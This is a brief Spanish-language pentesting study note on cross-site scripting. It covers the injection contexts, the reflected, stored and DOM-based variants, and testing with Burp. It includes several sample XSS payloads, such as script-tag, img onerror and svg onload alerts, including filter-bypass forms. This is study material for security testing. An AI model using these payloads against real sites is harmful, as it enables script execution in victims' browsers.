## Cross-Site Scripting (XSS)

### Qué es

Ejecución de JavaScript en el navegador de la víctima.

### Contextos (CLAVE)

* HTML
* Atributos
* JavaScript

### Reflejado

```html
<script>alert(1)</script>
```

### Stored

Buscar inputs que se guarden (comentarios, perfiles).

### DOM-based

```html
#<img src=x onerror=alert(1)>
```

### Bypass comunes

```html
<img src=x onerror=alert(1)>

"><svg/onload=alert(1)>
```

### Detección con Burp

* Interceptar
* Repetir payload
* Analizar contexto de salida

